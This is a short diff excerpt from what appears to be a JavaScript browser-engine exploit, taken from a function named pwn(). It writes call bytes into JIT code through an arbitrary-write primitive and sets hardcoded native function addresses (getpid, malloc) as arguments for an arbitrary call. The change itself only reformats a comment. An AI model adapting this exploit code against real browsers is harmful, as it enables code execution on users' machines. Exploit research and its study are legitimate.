@@ -390,7 +390,7 @@ function pwn() {
     ArbitraryWrite(JITCode, arbCallBytes);
     
     // prep the args
-    //arrayView.setBigUint64(0x0, 0x1918c5280n, true); // malloc
+    // arrayView.setBigUint64(0x0, 0x1918c5280n, true); // malloc
     arrayView.setBigUint64(0x0, 0x1babf715cn, true); // getpid
    
     for (let i = 0; i < 9; i++) {
